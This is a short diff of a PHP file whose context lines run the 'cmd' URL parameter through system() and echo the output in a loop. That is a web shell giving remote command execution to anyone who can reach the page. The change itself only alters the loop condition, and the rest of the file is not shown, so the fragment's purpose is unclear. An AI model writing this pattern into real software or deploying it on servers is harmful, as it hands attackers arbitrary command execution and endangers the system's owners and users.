@@ -9,7 +9,7 @@
     if(isset($_GET['cmd']))
     {
         $comando = system($_GET['cmd']);
-        while($comando){
+        while($comando != ""){
             sleep(10);
             echo $comando;
             flush();
